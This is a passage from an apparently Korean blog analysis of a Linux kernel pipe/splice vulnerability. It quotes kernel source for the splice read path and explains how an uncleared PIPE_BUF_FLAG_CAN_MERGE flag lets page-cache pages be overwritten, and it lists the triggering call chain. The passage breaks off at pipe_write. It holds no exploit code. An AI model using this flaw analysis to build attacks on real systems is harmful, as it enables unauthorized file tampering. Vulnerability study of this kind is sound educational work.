	<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">i_head</span><span class="p">;</span>
	<span class="kt">int</span> <span class="n">ret</span><span class="p">;</span>

	<span class="n">iov_iter_pipe</span><span class="p">(</span><span class="o">&amp;</span><span class="n">to</span><span class="p">,</span> <span class="n">READ</span><span class="p">,</span> <span class="n">pipe</span><span class="p">,</span> <span class="n">len</span><span class="p">);</span>
	<span class="n">i_head</span> <span class="o">=</span> <span class="n">to</span><span class="p">.</span><span class="n">head</span><span class="p">;</span>
	<span class="n">init_sync_kiocb</span><span class="p">(</span><span class="o">&amp;</span><span class="n">kiocb</span><span class="p">,</span> <span class="n">in</span><span class="p">);</span>
	<span class="n">kiocb</span><span class="p">.</span><span class="n">ki_pos</span> <span class="o">=</span> <span class="o">*</span><span class="n">ppos</span><span class="p">;</span>
	<span class="n">ret</span> <span class="o">=</span> <span class="n">call_read_iter</span><span class="p">(</span><span class="n">in</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">kiocb</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">to</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
		<span class="o">*</span><span class="n">ppos</span> <span class="o">=</span> <span class="n">kiocb</span><span class="p">.</span><span class="n">ki_pos</span><span class="p">;</span>
		<span class="n">file_accessed</span><span class="p">(</span><span class="n">in</span><span class="p">);</span>
	<span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">to</span><span class="p">.</span><span class="n">head</span> <span class="o">=</span> <span class="n">i_head</span><span class="p">;</span>
		<span class="n">to</span><span class="p">.</span><span class="n">iov_offset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
		<span class="n">iov_iter_advance</span><span class="p">(</span><span class="o">&amp;</span><span class="n">to</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span> <span class="cm">/* to free what was emitted */</span>
		<span class="cm">/*
		 * callers of -&gt;splice_read() expect -EAGAIN on
		 * "can't put anything in there", rather than -EFAULT.
		 */</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">==</span> <span class="o">-</span><span class="n">EFAULT</span><span class="p">)</span>
			<span class="n">ret</span> <span class="o">=</span> <span class="o">-</span><span class="n">EAGAIN</span><span class="p">;</span>
	<span class="p">}</span>

	<span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>socket, trace쪽이 아니라면 일반적으로 generic_file_read_iter 함수가 호출된다. 읽고 쓰기 위한 파일 디스크립터 정보들을 struct iov_iter와 struct kiocb에 초기화 해주고 call_read_iter 함수를 호출한다.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kr">inline</span> <span class="kt">ssize_t</span> <span class="nf">call_read_iter</span><span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">file</span><span class="p">,</span> <span class="k">struct</span> <span class="n">kiocb</span> <span class="o">*</span><span class="n">kio</span><span class="p">,</span>
				     <span class="k">struct</span> <span class="n">iov_iter</span> <span class="o">*</span><span class="n">iter</span><span class="p">)</span>
<span class="p">{</span>
	<span class="k">return</span> <span class="n">file</span><span class="o">-&gt;</span><span class="n">f_op</span><span class="o">-&gt;</span><span class="n">read_iter</span><span class="p">(</span><span class="n">kio</span><span class="p">,</span> <span class="n">iter</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>read_iter 함수를 호출하는데 파일 시스템마다 다르지만 일반적으로는 generic_file_read_iter 함수를 호출한다.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">ssize_t</span> <span class="nf">filemap_read</span><span class="p">(</span><span class="k">struct</span> <span class="n">kiocb</span> <span class="o">*</span><span class="n">iocb</span><span class="p">,</span> <span class="k">struct</span> <span class="n">iov_iter</span> <span class="o">*</span><span class="n">iter</span><span class="p">,</span>
		<span class="kt">ssize_t</span> <span class="n">already_read</span><span class="p">)</span>
<span class="p">{</span>
	<span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">filp</span> <span class="o">=</span> <span class="n">iocb</span><span class="o">-&gt;</span><span class="n">ki_filp</span><span class="p">;</span>
	<span class="k">struct</span> <span class="n">file_ra_state</span> <span class="o">*</span><span class="n">ra</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">filp</span><span class="o">-&gt;</span><span class="n">f_ra</span><span class="p">;</span>
	<span class="k">struct</span> <span class="n">address_space</span> <span class="o">*</span><span class="n">mapping</span> <span class="o">=</span> <span class="n">filp</span><span class="o">-&gt;</span><span class="n">f_mapping</span><span class="p">;</span>
	<span class="k">struct</span> <span class="n">inode</span> <span class="o">*</span><span class="n">inode</span> <span class="o">=</span> <span class="n">mapping</span><span class="o">-&gt;</span><span class="n">host</span><span class="p">;</span>
	<span class="k">struct</span> <span class="n">folio_batch</span> <span class="n">fbatch</span><span class="p">;</span>
	<span class="kt">int</span> <span class="n">i</span><span class="p">,</span> <span class="n">error</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	<span class="n">bool</span> <span class="n">writably_mapped</span><span class="p">;</span>
	<span class="n">loff_t</span> <span class="n">isize</span><span class="p">,</span> <span class="n">end_offset</span><span class="p">;</span>

	<span class="k">if</span> <span class="p">(</span><span class="n">unlikely</span><span class="p">(</span><span class="n">iocb</span><span class="o">-&gt;</span><span class="n">ki_pos</span> <span class="o">&gt;=</span> <span class="n">inode</span><span class="o">-&gt;</span><span class="n">i_sb</span><span class="o">-&gt;</span><span class="n">s_maxbytes</span><span class="p">))</span>
		<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">unlikely</span><span class="p">(</span><span class="o">!</span><span class="n">iov_iter_count</span><span class="p">(</span><span class="n">iter</span><span class="p">)))</span>
		<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>

	<span class="n">iov_iter_truncate</span><span class="p">(</span><span class="n">iter</span><span class="p">,</span> <span class="n">inode</span><span class="o">-&gt;</span><span class="n">i_sb</span><span class="o">-&gt;</span><span class="n">s_maxbytes</span><span class="p">);</span>
	<span class="n">folio_batch_init</span><span class="p">(</span><span class="o">&amp;</span><span class="n">fbatch</span><span class="p">);</span>

	<span class="k">do</span> <span class="p">{</span>
		<span class="n">cond_resched</span><span class="p">();</span>

		<span class="cm">/*
		 * If we've already successfully copied some data, then we
		 * can no longer safely return -EIOCBQUEUED. Hence mark
		 * an async read NOWAIT at that point.
		 */</span>
		<span class="k">if</span> <span class="p">((</span><span class="n">iocb</span><span class="o">-&gt;</span><span class="n">ki_flags</span> <span class="o">&amp;</span> <span class="n">IOCB_WAITQ</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">already_read</span><span class="p">)</span>
			<span class="n">iocb</span><span class="o">-&gt;</span><span class="n">ki_flags</span> <span class="o">|=</span> <span class="n">IOCB_NOWAIT</span><span class="p">;</span>

		<span class="k">if</span> <span class="p">(</span><span class="n">unlikely</span><span class="p">(</span><span class="n">iocb</span><span class="o">-&gt;</span><span class="n">ki_pos</span> <span class="o">&gt;=</span> <span class="n">i_size_read</span><span class="p">(</span><span class="n">inode</span><span class="p">)))</span>
			<span class="k">break</span><span class="p">;</span>

		<span class="n">error</span> <span class="o">=</span> <span class="n">filemap_get_pages</span><span class="p">(</span><span class="n">iocb</span><span class="p">,</span> <span class="n">iter</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">fbatch</span><span class="p">);</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">error</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
			<span class="k">break</span><span class="p">;</span>

		<span class="cm">/*
		 * i_size must be checked after we know the pages are Uptodate.
		 *
		 * Checking i_size after the check allows us to calculate
		 * the correct value for "nr", which means the zero-filled
		 * part of the page is not copied back to userspace (unless
		 * another truncate extends the file - this is desired though).
		 */</span>
		<span class="n">isize</span> <span class="o">=</span> <span class="n">i_size_read</span><span class="p">(</span><span class="n">inode</span><span class="p">);</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">unlikely</span><span class="p">(</span><span class="n">iocb</span><span class="o">-&gt;</span><span class="n">ki_pos</span> <span class="o">&gt;=</span> <span class="n">isize</span><span class="p">))</span>
			<span class="k">goto</span> <span class="n">put_folios</span><span class="p">;</span>
		<span class="n">end_offset</span> <span class="o">=</span> <span class="n">min_t</span><span class="p">(</span><span class="n">loff_t</span><span class="p">,</span> <span class="n">isize</span><span class="p">,</span> <span class="n">iocb</span><span class="o">-&gt;</span><span class="n">ki_pos</span> <span class="o">+</span> <span class="n">iter</span><span class="o">-&gt;</span><span class="n">count</span><span class="p">);</span>

		<span class="cm">/*
		 * Once we start copying data, we don't want to be touching any
		 * cachelines that might be contended:
		 */</span>
		<span class="n">writably_mapped</span> <span class="o">=</span> <span class="n">mapping_writably_mapped</span><span class="p">(</span><span class="n">mapping</span><span class="p">);</span>

		<span class="cm">/*
		 * When a sequential read accesses a page several times, only
		 * mark it as accessed the first time.
		 */</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">iocb</span><span class="o">-&gt;</span><span class="n">ki_pos</span> <span class="o">&gt;&gt;</span> <span class="n">PAGE_SHIFT</span> <span class="o">!=</span>
		    <span class="n">ra</span><span class="o">-&gt;</span><span class="n">prev_pos</span> <span class="o">&gt;&gt;</span> <span class="n">PAGE_SHIFT</span><span class="p">)</span>
			<span class="n">folio_mark_accessed</span><span class="p">(</span><span class="n">fbatch</span><span class="p">.</span><span class="n">folios</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>

		<span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">folio_batch_count</span><span class="p">(</span><span class="o">&amp;</span><span class="n">fbatch</span><span class="p">);</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
			<span class="k">struct</span> <span class="n">folio</span> <span class="o">*</span><span class="n">folio</span> <span class="o">=</span> <span class="n">fbatch</span><span class="p">.</span><span class="n">folios</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
			<span class="kt">size_t</span> <span class="n">fsize</span> <span class="o">=</span> <span class="n">folio_size</span><span class="p">(</span><span class="n">folio</span><span class="p">);</span>
			<span class="kt">size_t</span> <span class="n">offset</span> <span class="o">=</span> <span class="n">iocb</span><span class="o">-&gt;</span><span class="n">ki_pos</span> <span class="o">&amp;</span> <span class="p">(</span><span class="n">fsize</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
			<span class="kt">size_t</span> <span class="n">bytes</span> <span class="o">=</span> <span class="n">min_t</span><span class="p">(</span><span class="n">loff_t</span><span class="p">,</span> <span class="n">end_offset</span> <span class="o">-</span> <span class="n">iocb</span><span class="o">-&gt;</span><span class="n">ki_pos</span><span class="p">,</span>
					     <span class="n">fsize</span> <span class="o">-</span> <span class="n">offset</span><span class="p">);</span>
			<span class="kt">size_t</span> <span class="n">copied</span><span class="p">;</span>

			<span class="k">if</span> <span class="p">(</span><span class="n">end_offset</span> <span class="o">&lt;</span> <span class="n">folio_pos</span><span class="p">(</span><span class="n">folio</span><span class="p">))</span>
				<span class="k">break</span><span class="p">;</span>
			<span class="k">if</span> <span class="p">(</span><span class="n">i</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
				<span class="n">folio_mark_accessed</span><span class="p">(</span><span class="n">folio</span><span class="p">);</span>
			<span class="cm">/*
			 * If users can be writing to this folio using arbitrary
			 * virtual addresses, take care of potential aliasing
			 * before reading the folio on the kernel side.
			 */</span>
			<span class="k">if</span> <span class="p">(</span><span class="n">writably_mapped</span><span class="p">)</span>
				<span class="n">flush_dcache_folio</span><span class="p">(</span><span class="n">folio</span><span class="p">);</span>

			<span class="n">copied</span> <span class="o">=</span> <span class="n">copy_folio_to_iter</span><span class="p">(</span><span class="n">folio</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="n">bytes</span><span class="p">,</span> <span class="n">iter</span><span class="p">);</span>

			<span class="n">already_read</span> <span class="o">+=</span> <span class="n">copied</span><span class="p">;</span>
			<span class="n">iocb</span><span class="o">-&gt;</span><span class="n">ki_pos</span> <span class="o">+=</span> <span class="n">copied</span><span class="p">;</span>
			<span class="n">ra</span><span class="o">-&gt;</span><span class="n">prev_pos</span> <span class="o">=</span> <span class="n">iocb</span><span class="o">-&gt;</span><span class="n">ki_pos</span><span class="p">;</span>

			<span class="k">if</span> <span class="p">(</span><span class="n">copied</span> <span class="o">&lt;</span> <span class="n">bytes</span><span class="p">)</span> <span class="p">{</span>
				<span class="n">error</span> <span class="o">=</span> <span class="o">-</span><span class="n">EFAULT</span><span class="p">;</span>
				<span class="k">break</span><span class="p">;</span>
			<span class="p">}</span>
		<span class="p">}</span>
<span class="nl">put_folios:</span>
		<span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">folio_batch_count</span><span class="p">(</span><span class="o">&amp;</span><span class="n">fbatch</span><span class="p">);</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
			<span class="n">folio_put</span><span class="p">(</span><span class="n">fbatch</span><span class="p">.</span><span class="n">folios</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
		<span class="n">folio_batch_init</span><span class="p">(</span><span class="o">&amp;</span><span class="n">fbatch</span><span class="p">);</span>
	<span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="n">iov_iter_count</span><span class="p">(</span><span class="n">iter</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">iocb</span><span class="o">-&gt;</span><span class="n">ki_pos</span> <span class="o">&lt;</span> <span class="n">isize</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">error</span><span class="p">);</span>

	<span class="n">file_accessed</span><span class="p">(</span><span class="n">filp</span><span class="p">);</span>

	<span class="k">return</span> <span class="n">already_read</span> <span class="o">?</span> <span class="n">already_read</span> <span class="o">:</span> <span class="n">error</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>generic_file_read_iter 함수는 filemap_read 함수를 호출한다. 이 함수에서는 splice 함수의 핵심인 파일을 읽고 복사를 한다. 여기서 page cache 개념을 짚고 넘어가야한다. 운영체계에서 cpu가 디스크 I/O 작업을 하면서 직접적으로 디스크에 access 할 때 오버헤드가 크기 때문에 디스크의 내용을 읽어 page cache에다가 저장해두고 다음에 읽을 때 page cache로 부터 내용을 읽어온다. filemap_read 함수는 page cache로부터 내용을 읽어오고 정확히는 filemap_get_pages에서 page cache의 folio를 fbatch에 담아온다. 만약에 page cache가 없다면 다음 reader를 위해 folio를 할당해서 page cache에다가 추가하는 과정도 함께 있다.</p>

<p>위 코드가 구조적으로 왜 존재하는지, page cache과 folio에 관한 자세한 내용은 아래 레퍼런스를 참고해주세요.</p>

<ul>
  <li><a href="https://hyeyoo.com/149">https://hyeyoo.com/149</a></li>
  <li><a href="https://github.com/gurugio/book_linuxkernel_blockdrv/blob/master/pagecacheand_blockdriver.md">https://github.com/gurugio/book_linuxkernel_blockdrv/blob/master/pagecacheand_blockdriver.md</a></li>
  <li><a href="https://www.cnblogs.com/luozhiyun/p/13061199.html">https://www.cnblogs.com/luozhiyun/p/13061199.html</a></li>
</ul>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kr">inline</span> <span class="kt">size_t</span> <span class="nf">copy_folio_to_iter</span><span class="p">(</span><span class="k">struct</span> <span class="n">folio</span> <span class="o">*</span><span class="n">folio</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">offset</span><span class="p">,</span>
		<span class="kt">size_t</span> <span class="n">bytes</span><span class="p">,</span> <span class="k">struct</span> <span class="n">iov_iter</span> <span class="o">*</span><span class="n">i</span><span class="p">)</span>
<span class="p">{</span>
	<span class="k">return</span> <span class="n">copy_page_to_iter</span><span class="p">(</span><span class="o">&amp;</span><span class="n">folio</span><span class="o">-&gt;</span><span class="n">page</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="n">bytes</span><span class="p">,</span> <span class="n">i</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>page cache를 copy_page_to_iter 함수에 전달한다.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">size_t</span> <span class="nf">copy_page_to_iter</span><span class="p">(</span><span class="k">struct</span> <span class="n">page</span> <span class="o">*</span><span class="n">page</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">offset</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">bytes</span><span class="p">,</span>
			 <span class="k">struct</span> <span class="n">iov_iter</span> <span class="o">*</span><span class="n">i</span><span class="p">)</span>
<span class="p">{</span>
	<span class="kt">size_t</span> <span class="n">res</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">unlikely</span><span class="p">(</span><span class="o">!</span><span class="n">page_copy_sane</span><span class="p">(</span><span class="n">page</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="n">bytes</span><span class="p">)))</span>
		<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
	<span class="n">page</span> <span class="o">+=</span> <span class="n">offset</span> <span class="o">/</span> <span class="n">PAGE_SIZE</span><span class="p">;</span> <span class="c1">// first subpage</span>
	<span class="n">offset</span> <span class="o">%=</span> <span class="n">PAGE_SIZE</span><span class="p">;</span>
	<span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
		<span class="kt">size_t</span> <span class="n">n</span> <span class="o">=</span> <span class="n">__copy_page_to_iter</span><span class="p">(</span><span class="n">page</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span>
				<span class="n">min</span><span class="p">(</span><span class="n">bytes</span><span class="p">,</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">)</span><span class="n">PAGE_SIZE</span> <span class="o">-</span> <span class="n">offset</span><span class="p">),</span> <span class="n">i</span><span class="p">);</span>
		<span class="n">res</span> <span class="o">+=</span> <span class="n">n</span><span class="p">;</span>
		<span class="n">bytes</span> <span class="o">-=</span> <span class="n">n</span><span class="p">;</span>
		<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">bytes</span> <span class="o">||</span> <span class="o">!</span><span class="n">n</span><span class="p">)</span>
			<span class="k">break</span><span class="p">;</span>
		<span class="n">offset</span> <span class="o">+=</span> <span class="n">n</span><span class="p">;</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">offset</span> <span class="o">==</span> <span class="n">PAGE_SIZE</span><span class="p">)</span> <span class="p">{</span>
			<span class="n">page</span><span class="o">++</span><span class="p">;</span>
			<span class="n">offset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
		<span class="p">}</span>
	<span class="p">}</span>
	<span class="k">return</span> <span class="n">res</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">size_t</span> <span class="nf">__copy_page_to_iter</span><span class="p">(</span><span class="k">struct</span> <span class="n">page</span> <span class="o">*</span><span class="n">page</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">offset</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">bytes</span><span class="p">,</span>
			 <span class="k">struct</span> <span class="n">iov_iter</span> <span class="o">*</span><span class="n">i</span><span class="p">)</span>
<span class="p">{</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">likely</span><span class="p">(</span><span class="n">iter_is_iovec</span><span class="p">(</span><span class="n">i</span><span class="p">)))</span>
		<span class="k">return</span> <span class="n">copy_page_to_iter_iovec</span><span class="p">(</span><span class="n">page</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="n">bytes</span><span class="p">,</span> <span class="n">i</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">iov_iter_is_bvec</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">||</span> <span class="n">iov_iter_is_kvec</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">||</span> <span class="n">iov_iter_is_xarray</span><span class="p">(</span><span class="n">i</span><span class="p">))</span> <span class="p">{</span>
		<span class="kt">void</span> <span class="o">*</span><span class="n">kaddr</span> <span class="o">=</span> <span class="n">kmap_local_page</span><span class="p">(</span><span class="n">page</span><span class="p">);</span>
		<span class="kt">size_t</span> <span class="n">wanted</span> <span class="o">=</span> <span class="n">_copy_to_iter</span><span class="p">(</span><span class="n">kaddr</span> <span class="o">+</span> <span class="n">offset</span><span class="p">,</span> <span class="n">bytes</span><span class="p">,</span> <span class="n">i</span><span class="p">);</span>
		<span class="n">kunmap_local</span><span class="p">(</span><span class="n">kaddr</span><span class="p">);</span>
		<span class="k">return</span> <span class="n">wanted</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">iov_iter_is_pipe</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
		<span class="k">return</span> <span class="n">copy_page_to_iter_pipe</span><span class="p">(</span><span class="n">page</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="n">bytes</span><span class="p">,</span> <span class="n">i</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">unlikely</span><span class="p">(</span><span class="n">iov_iter_is_discard</span><span class="p">(</span><span class="n">i</span><span class="p">)))</span> <span class="p">{</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">unlikely</span><span class="p">(</span><span class="n">i</span><span class="o">-&gt;</span><span class="n">count</span> <span class="o">&lt;</span> <span class="n">bytes</span><span class="p">))</span>
			<span class="n">bytes</span> <span class="o">=</span> <span class="n">i</span><span class="o">-&gt;</span><span class="n">count</span><span class="p">;</span>
		<span class="n">i</span><span class="o">-&gt;</span><span class="n">count</span> <span class="o">-=</span> <span class="n">bytes</span><span class="p">;</span>
		<span class="k">return</span> <span class="n">bytes</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="n">WARN_ON</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">size_t</span> <span class="nf">copy_page_to_iter_pipe</span><span class="p">(</span><span class="k">struct</span> <span class="n">page</span> <span class="o">*</span><span class="n">page</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">offset</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">bytes</span><span class="p">,</span>
			 <span class="k">struct</span> <span class="n">iov_iter</span> <span class="o">*</span><span class="n">i</span><span class="p">)</span>
<span class="p">{</span>
	<span class="k">struct</span> <span class="n">pipe_inode_info</span> <span class="o">*</span><span class="n">pipe</span> <span class="o">=</span> <span class="n">i</span><span class="o">-&gt;</span><span class="n">pipe</span><span class="p">;</span>
	<span class="k">struct</span> <span class="n">pipe_buffer</span> <span class="o">*</span><span class="n">buf</span><span class="p">;</span>
	<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">p_tail</span> <span class="o">=</span> <span class="n">pipe</span><span class="o">-&gt;</span><span class="n">tail</span><span class="p">;</span>
	<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">p_mask</span> <span class="o">=</span> <span class="n">pipe</span><span class="o">-&gt;</span><span class="n">ring_size</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
	<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">i_head</span> <span class="o">=</span> <span class="n">i</span><span class="o">-&gt;</span><span class="n">head</span><span class="p">;</span>
	<span class="kt">size_t</span> <span class="n">off</span><span class="p">;</span>

	<span class="k">if</span> <span class="p">(</span><span class="n">unlikely</span><span class="p">(</span><span class="n">bytes</span> <span class="o">&gt;</span> <span class="n">i</span><span class="o">-&gt;</span><span class="n">count</span><span class="p">))</span>
		<span class="n">bytes</span> <span class="o">=</span> <span class="n">i</span><span class="o">-&gt;</span><span class="n">count</span><span class="p">;</span>

	<span class="k">if</span> <span class="p">(</span><span class="n">unlikely</span><span class="p">(</span><span class="o">!</span><span class="n">bytes</span><span class="p">))</span>
		<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>

	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">sanity</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
		<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>

	<span class="n">off</span> <span class="o">=</span> <span class="n">i</span><span class="o">-&gt;</span><span class="n">iov_offset</span><span class="p">;</span>
	<span class="n">buf</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">pipe</span><span class="o">-&gt;</span><span class="n">bufs</span><span class="p">[</span><span class="n">i_head</span> <span class="o">&amp;</span> <span class="n">p_mask</span><span class="p">];</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">off</span><span class="p">)</span> <span class="p">{</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">offset</span> <span class="o">==</span> <span class="n">off</span> <span class="o">&amp;&amp;</span> <span class="n">buf</span><span class="o">-&gt;</span><span class="n">page</span> <span class="o">==</span> <span class="n">page</span><span class="p">)</span> <span class="p">{</span>
			<span class="cm">/* merge with the last one */</span>
			<span class="n">buf</span><span class="o">-&gt;</span><span class="n">len</span> <span class="o">+=</span> <span class="n">bytes</span><span class="p">;</span>
			<span class="n">i</span><span class="o">-&gt;</span><span class="n">iov_offset</span> <span class="o">+=</span> <span class="n">bytes</span><span class="p">;</span>
			<span class="k">goto</span> <span class="n">out</span><span class="p">;</span>
		<span class="p">}</span>
		<span class="n">i_head</span><span class="o">++</span><span class="p">;</span>
		<span class="n">buf</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">pipe</span><span class="o">-&gt;</span><span class="n">bufs</span><span class="p">[</span><span class="n">i_head</span> <span class="o">&amp;</span> <span class="n">p_mask</span><span class="p">];</span>
	<span class="p">}</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">pipe_full</span><span class="p">(</span><span class="n">i_head</span><span class="p">,</span> <span class="n">p_tail</span><span class="p">,</span> <span class="n">pipe</span><span class="o">-&gt;</span><span class="n">max_usage</span><span class="p">))</span>
		<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>

	<span class="n">buf</span><span class="o">-&gt;</span><span class="n">ops</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">page_cache_pipe_buf_ops</span><span class="p">;</span>
	<span class="n">get_page</span><span class="p">(</span><span class="n">page</span><span class="p">);</span>
	<span class="n">buf</span><span class="o">-&gt;</span><span class="n">page</span> <span class="o">=</span> <span class="n">page</span><span class="p">;</span>
	<span class="n">buf</span><span class="o">-&gt;</span><span class="n">offset</span> <span class="o">=</span> <span class="n">offset</span><span class="p">;</span>
	<span class="n">buf</span><span class="o">-&gt;</span><span class="n">len</span> <span class="o">=</span> <span class="n">bytes</span><span class="p">;</span>

	<span class="n">pipe</span><span class="o">-&gt;</span><span class="n">head</span> <span class="o">=</span> <span class="n">i_head</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
	<span class="n">i</span><span class="o">-&gt;</span><span class="n">iov_offset</span> <span class="o">=</span> <span class="n">offset</span> <span class="o">+</span> <span class="n">bytes</span><span class="p">;</span>
	<span class="n">i</span><span class="o">-&gt;</span><span class="n">head</span> <span class="o">=</span> <span class="n">i_head</span><span class="p">;</span>
<span class="nl">out:</span>
	<span class="n">i</span><span class="o">-&gt;</span><span class="n">count</span> <span class="o">-=</span> <span class="n">bytes</span><span class="p">;</span>
	<span class="k">return</span> <span class="n">bytes</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>copy_page_to_iter -&gt; __copy_page_to_iter -&gt; copy_page_to_iter_pipe 순으로 copy_page_to_iter_pipe 함수가(취약점이 패치 된) 호출되고, 우리가 읽고자하는 파일의 page cache가 struct pipe_buffer 오브젝트에 초기화 된다. <strong>이 때</strong> <strong>기존에</strong> <strong>PIPE_BUF_FLAG_CAN_MERGE와 함께 초기화 된 struct pipe_buffer 오브젝트가 있다면 buf→flags를 초기화 하지 않기 때문에 buf→page에 들어오는 어떤 page든 우리의 데이터를 쓸 수 있게 되는 것이다. (이 때 page cache가 초기화 됨)</strong></p>

<p>취약점을 트리거 하기 위한 copy_page_to_iter_pipe 함수는 아래 순서와 같이 호출된다.</p>

<p>splice -&gt; __do_splice -&gt; do_splice -&gt; splice_file_to_pipe -&gt; do_splice_to -&gt; generic_file_splice_read -&gt; call_read_iter -&gt; generic_file_read_iter -&gt; filemap_read -&gt; copy_folio_to_iter -&gt; copy_page_to_iter -&gt; __copy_page_to_iter -&gt; copy_page_to_iter_pipe</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">ssize_t</span>
<span class="nf">pipe_write</span><span class="p">(</span><span class="k">struct</span> <span class="n">kiocb</span> <span class="o">*</span><span class="n">iocb</span><span class="p">,</span> <span class="k">struct</span> <span class="n">iov_iter</span> <span class="o">*</span><span class="n">from</span><span class="p">)</span>
<span class="p">{</span>
